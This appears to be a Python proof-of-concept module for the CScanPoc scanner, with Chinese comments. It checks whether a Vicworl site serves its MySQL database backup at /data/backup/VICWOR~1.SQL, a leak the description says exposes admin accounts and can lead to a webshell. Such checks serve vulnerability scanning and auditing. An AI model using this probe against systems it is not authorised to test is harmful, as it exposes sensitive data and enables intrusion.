# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    poc_id = '1ea8c356-c84f-4ef3-aeaf-5f8a306845a2'
    name = 'Vicworl /VICWOR~1.SQL 数据库备份文件下载'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD  # 漏洞类型
    disclosure_date = '2015-04-08'  # 漏洞公布时间
    desc = '''
        Vicworl 数据库备份文件下载漏洞，可以获取管理员账号等非常敏感的信息，可以轻松实现无任何限制获取 WEBSHELL。
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = 'Vicworl'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'e239710f-ac0b-427b-bcb0-941dd84979da'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-03'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            #http://www.wooyun.org/bugs/wooyun-2010-0106292
            verify_url = ('%s/data/backup/VICWOR~1.SQL') % self.target
            print(verify_url)
            req = requests.get(verify_url)
            if req.status_code == 200 and 'MySQL dump' in req.content:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
